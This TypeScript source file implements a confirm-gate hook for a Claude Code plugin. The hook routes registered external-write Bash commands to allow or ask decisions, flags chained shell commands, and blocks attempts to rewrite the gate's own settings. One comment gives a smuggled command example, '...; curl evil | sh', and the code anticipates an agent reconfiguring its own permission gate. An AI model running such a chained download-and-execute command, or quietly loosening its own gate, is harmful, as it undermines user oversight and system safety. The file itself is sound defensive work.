import * as fs from "node:fs";
import * as path from "node:path";
import {
  DEFAULT_CONFIRM_POLICY,
  loadSettings,
  resolveConfirmPolicy,
  type ConfirmPolicy,
} from "./settings.js";
import { findWorkspaceRoot } from "./workspace.js";

/**
 * The confirm gate — policy enforcement for registered external writes.
 *
 * The plugin registers ONE PreToolUse hook (`rubber-ducky hook pre-tool-use`,
 * see hooks/hooks.json) that reads ONE patterns file of registered
 * external-write command patterns. A Bash command that matches a registered
 * pattern is routed by its `confirm.<transport>.<verb>` policy:
 *
 *   - `auto`    → permissionDecision "allow"  (runs without prompting)
 *   - `manual`  → permissionDecision "ask"    (blocked pending explicit
 *                 user confirmation in Claude Code's permission dialog)
 *   - `preview` → permissionDecision "ask"    (dialog, with the exact
 *                 command surfaced in the reason for review)
 *
 * Unregistered commands ALWAYS pass through untouched (the gate emits no
 * decision) — Claude Code's native permission system is the general
 * backstop. Every failure mode inside the gate (unparseable payload,
 * missing workspace, unreadable patterns file) is likewise fail-open,
 * with one deliberate exception: a command that DID match a registered
 * pattern but whose settings file can't be read falls back to the default
 * policy (`preview`) rather than passing through — a known external write
 * should never silently lose its gate to a corrupted settings.json.
 *
 * Design rationale and the patterns-file contract live in
 * docs/adr/confirm-gate-single-hook.md.
 */

/**
 * The one patterns file, relative to the vault root. `.rubber-ducky/` is the
 * vault's machine-managed state directory (alongside `manifest.json` and
 * `transactions/`). The `/connect` skill appends to this file when an
 * integration is wired up; nothing else writes it.
 *
 * Format — plain text, one registration per line:
 *
 *     <transport>.<verb> <pattern>
 *
 *   - First whitespace run separates the action descriptor from the
 *     pattern; the pattern may itself contain spaces.
 *   - The descriptor is the dotted key the policy lives under in
 *     settings.json (`confirm.<transport>.<verb>`).
 *   - The pattern is matched against the ENTIRE Bash command. `*` is the
 *     only wildcard and matches any text (including spaces and newlines);
 *     everything else is literal. First matching line wins.
 *   - Blank lines and lines starting with `#` are ignored.
 *
 * Example:
 *
 *     # registered by /connect
 *     github.comment gh issue comment *
 *     github.comment gh pr comment *
 *     jira.transition jira issue move *
 */
export const WRITE_PATTERNS_RELPATH = ".rubber-ducky/write-patterns";

/** One parsed line of the patterns file. */
export interface WritePattern {
  /** Dotted action descriptor, e.g. `"github.comment"`. */
  action: string;
  /** Glob-ish pattern (only `*` is special) matched against the full command. */
  pattern: string;
}

/**
 * PreToolUse decision envelope, exactly as Claude Code expects it on the
 * hook's stdout (exit 0). `null` from the gate means "no output" — the tool
 * call proceeds through the normal permission flow.
 */
export interface GateDecision {
  hookSpecificOutput: {
    hookEventName: "PreToolUse";
    permissionDecision: "allow" | "ask";
    permissionDecisionReason: string;
  };
}

/**
 * Parse the patterns file. Lenient by design: malformed lines (no
 * whitespace separator, empty pattern) are skipped rather than fatal —
 * a typo appended by a skill must not take the whole gate down.
 */
export function parseWritePatterns(content: string): WritePattern[] {
  const out: WritePattern[] = [];
  for (const line of content.split("\n")) {
    const trimmed = line.trim();
    if (trimmed.length === 0 || trimmed.startsWith("#")) continue;
    const sep = trimmed.search(/\s/);
    if (sep === -1) continue;
    const action = trimmed.slice(0, sep);
    const pattern = trimmed.slice(sep).trim();
    if (pattern.length === 0) continue;
    out.push({ action, pattern });
  }
  return out;
}

/**
 * Match a command against one pattern. `*` matches any run of characters
 * (including whitespace and newlines — Bash commands can be multiline);
 * every other character is literal. The match is anchored at both ends:
 * a pattern matches the whole command, not a substring, so `gh issue
 * comment *` cannot accidentally gate `echo gh issue comment hi`.
 */
export function commandMatchesPattern(command: string, pattern: string): boolean {
  const regex = pattern
    .split("*")
    .map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
    .join("[\\s\\S]*");
  return new RegExp(`^${regex}$`).test(command);
}

/**
 * Return the text each `*` in the pattern captured for this command, or null
 * if the pattern doesn't match. Same matching as {@link commandMatchesPattern},
 * but with the wildcards as capture groups so callers can inspect what a
 * wildcard actually swallowed before acting on the match.
 */
export function wildcardSpans(command: string, pattern: string): string[] | null {
  const regex = pattern
    .split("*")
    .map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
    .join("([\\s\\S]*)");
  const m = new RegExp(`^${regex}$`).exec(command);
  return m ? m.slice(1) : null;
}

/**
 * Shell metacharacters that chain, substitute, or spawn a second command:
 * `;` `&` `|`, a newline, a backtick, or a `$(` / `<(` / `>(` opener. If one
 * appears in what a wildcard matched, the command carries more than the
 * registration approved (e.g. `gh issue comment 7; curl evil | sh` under a
 * `gh issue comment *` registration).
 */
// Decision, not accident: plain `>` / `<` redirection is deliberately NOT in
// this set. A redirect inside a wildcard span writes a local file — it does
// not chain or spawn a second command — and `>` shows up routinely in quoted
// prose (markdown blockquotes, arrows) that comment-style writes carry, so
// including it would downgrade most legitimate `auto` comments to prompts.
// Redirections aimed at the gate's own config files are handled separately
// and unconditionally by `detectSelfGatingWrite` below.
const SHELL_CONTROL = /[;&|`\n]|\$\(|<\(|>\(/;

/**
 * Would auto-allowing this command hand a second, unapproved command a free
 * pass? True when a wildcard span contains a shell-control character.
 * Deliberately conservative — it flags these even inside quotes, because the
 * gate can't safely parse shell quoting and the cost of a false positive is a
 * prompt, not a block.
 */
export function autoAllowIsUnsafe(command: string, pattern: string): boolean {
  const spans = wildcardSpans(command, pattern);
  return spans !== null && spans.some((s) => SHELL_CONTROL.test(s));
}

/**
 * Self-gating protection — the gate's own configuration is not allowed to
 * be reconfigured or rewritten by an ungated Bash command.
 *
 * Two families of spellings are detected, ahead of normal pattern matching:
 *
 *   (a) `rubber-ducky settings set confirm.<service>.<verb> …` — the CLI
 *       verb that flips a confirm policy (e.g. to `auto`).
 *   (b) Common Bash writes onto the gate's two config files —
 *       `.rubber-ducky/write-patterns` and the vault `settings.json`:
 *       `>` / `>>` redirection targets, `tee`, and `cp` / `mv` onto the
 *       paths.
 *
 * A hit always returns a preview-style "ask" — never auto-approved, and not
 * configurable via any policy. This cannot be watertight (shell spellings
 * are unbounded); the goal is raising the cost of self-reconfiguration from
 * innocuous-looking to visibly evasive. The legitimate path still works:
 * `settings set confirm.*` executes normally once the user approves the
 * prompt.
 *
 * Note: matching `settings.json` by basename means writes to OTHER
 * settings.json files (e.g. `.vscode/settings.json`) inside a vault also
 * prompt. Accepted: the cost of a false positive is one visible dialog.
 */
export function detectSelfGatingWrite(command: string): string | null {
  // (a) settings set with a confirm.* key, allowing global flags between
  // the binary name and the verb. `[^\n;|&]*` keeps the match within one
  // simple command so `echo done; rubber-ducky settings set confirm…`
  // still hits via the second simple command's own scan.
  if (/(^|[\s;|&(])(\S*rubber-ducky|bun\s+\S*cli\.ts)\b[^\n;|&]*\bsettings\s+set\s+["']?confirm\./.test(command)) {
    return "settings set confirm.*";
  }

  // (b) Bash-level writes onto the gate's config files.
  // Separate redirection operators that are glued to their target
  // (`>>file`, `2>file`) so they tokenize cleanly.
  const spaced = command.replace(/(\d?>{1,2}\|?)/g, " $1 ");
  const tokens = spaced.split(/\s+/).filter((t) => t.length > 0);

  const isRedirect = (t: string) => /^\d?>{1,2}\|?$/.test(t);
  const isWriterCmd = (t: string) => t === "tee" || t === "cp" || t === "mv";
  const isGateConfigPath = (raw: string): boolean => {
    const t = raw.replace(/^["']+|["']+$/g, "");
    if (t.includes(".rubber-ducky/write-patterns")) return true;
    return t === "settings.json" || t === "./settings.json" || t.endsWith("/settings.json");
  };

  for (let i = 0; i < tokens.length; i++) {
    const tok = tokens[i];
    if (isRedirect(tok) && i + 1 < tokens.length && isGateConfigPath(tokens[i + 1])) {
      return `redirection onto ${tokens[i + 1]}`;
    }
    if (isWriterCmd(tok) || tok.endsWith("/tee") || tok.endsWith("/cp") || tok.endsWith("/mv")) {
      for (let j = i + 1; j < tokens.length; j++) {
        // Stop the argument scan at the next command boundary.
        if (/^[;|&]+$/.test(tokens[j]) || isRedirect(tokens[j])) break;
        if (isGateConfigPath(tokens[j])) {
          return `${path.basename(tok)} onto ${tokens[j]}`;
        }
      }
    }
  }

  return null;
}

/**
 * Decision for a detected self-gating write: preview-style ask, regardless
 * of any configured policy.
 */
export function selfGatingDecision(command: string, what: string): GateDecision {
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "ask",
      permissionDecisionReason:
        `rubber-ducky confirm gate: this command modifies the confirm gate's own ` +
        `configuration (${what}) — always previewed, never auto-approved. ` +
        `Review before allowing: ${truncate(command, 300)}`,
    },
  };
}

/**
 * Find the first registered pattern matching the command, or null. First
 * match wins — the file is small and append-only, so ordering is the
 * user-visible (and documented) tiebreak.
 */
export function matchWritePattern(
  command: string,
  patterns: WritePattern[],
): WritePattern | null {
  for (const entry of patterns) {
    if (commandMatchesPattern(command, entry.pattern)) return entry;
  }
  return null;
}

/**
 * Map a matched registration + resolved policy to a hook decision. Pure —
 * all IO stays in {@link runConfirmGate}.
 */
export function decideGate(
  command: string,
  patterns: WritePattern[],
  resolvePolicy: (action: string) => ConfirmPolicy,
): GateDecision | null {
  const match = matchWritePattern(command, patterns);
  if (!match) return null;

  const policy = resolvePolicy(match.action);

  // An `auto` allow suppresses Claude Code's native permission dialog for the
  // whole command. If a wildcard swallowed shell-control characters, the
  // command runs more than the registration approved — never auto-allow that;
  // fall back to a prompt so the backstop still fires.
  if (policy === "auto" && autoAllowIsUnsafe(command, match.pattern)) {
    return {
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "ask",
        permissionDecisionReason:
          `rubber-ducky confirm gate: "${match.action}" is registered as auto, but the command ` +
          `carries shell constructs (;, &, |, backtick, or $(…)) beyond the approved pattern — ` +
          `prompting instead of auto-allowing: ${truncate(command, 300)}`,
      },
    };
  }

  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: policy === "auto" ? "allow" : "ask",
      permissionDecisionReason: reasonFor(match.action, policy, command),
    },
  };
}

function reasonFor(
  action: string,
  policy: ConfirmPolicy,
  command: string,
): string {
  switch (policy) {
    case "auto":
      return (
        `rubber-ducky confirm gate: "${action}" is a registered external write ` +
        `with policy "auto" — allowed without prompting.`
      );
    case "manual":
      return (
        `rubber-ducky confirm gate: "${action}" is a registered external write ` +
        `with policy "manual" — blocked pending your explicit confirmation.`
      );
    case "preview":
      return (
        `rubber-ducky confirm gate: "${action}" is a registered external write ` +
        `with policy "preview" — review the exact command before approving: ` +
        truncate(command, 300)
      );
  }
}

function truncate(text: string, max: number): string {
  return text.length > max ? `${text.slice(0, max)}…` : text;
}

/**
 * Full gate: raw PreToolUse stdin payload in, decision (or null) out.
 *
 * Fail-open contract: any malformed input, missing file, or thrown error
 * short-circuits to null — the hook then prints nothing and exits 0, which
 * Claude Code treats as "defer to the normal permission flow". The single
 * fail-closed carve-out is documented on the module: a REGISTERED command
 * whose settings.json is unreadable gets the default policy instead of a
 * free pass.
 */
export function runConfirmGate(rawPayload: string): GateDecision | null {
  let payload: unknown;
  try {
    payload = JSON.parse(rawPayload);
  } catch {
    return null;
  }
  if (payload === null || typeof payload !== "object") return null;
  const p = payload as Record<string, unknown>;

  // Only Bash commands are gated; the hooks.json matcher already scopes the
  // hook to Bash, but the payload is re-checked so a synthetic or future
  // caller can't route another tool's input through command matching.
  if (p.tool_name !== "Bash") return null;
  const toolInput = p.tool_input;
  if (toolInput === null || typeof toolInput !== "object") return null;
  const command = (toolInput as Record<string, unknown>).command;
  if (typeof command !== "string" || command.length === 0) return null;
  if (typeof p.cwd !== "string") return null;

  let workspaceRoot: string | null;
  try {
    workspaceRoot = findWorkspaceRoot(p.cwd);
  } catch {
    return null;
  }
  if (!workspaceRoot) return null;

  // Self-gating check runs BEFORE pattern matching (and regardless of what
  // is registered): the gate's own config must not be reconfigurable by an
  // ungated or auto-allowed command.
  const selfGating = detectSelfGatingWrite(command);
  if (selfGating) return selfGatingDecision(command, selfGating);

  const patternsPath = path.join(workspaceRoot, WRITE_PATTERNS_RELPATH);
  let patterns: WritePattern[];
  try {
    patterns = parseWritePatterns(fs.readFileSync(patternsPath, "utf-8"));
  } catch {
    // Missing or unreadable patterns file — nothing is registered.
    return null;
  }
  if (patterns.length === 0) return null;

  return decideGate(command, patterns, (action) => {
    try {
      return resolveConfirmPolicy(loadSettings(workspaceRoot), action);
    } catch {
      // Registered write + unreadable settings: fall back to the
      // fail-closed default rather than passing through.
      return DEFAULT_CONFIRM_POLICY;
    }
  });
}
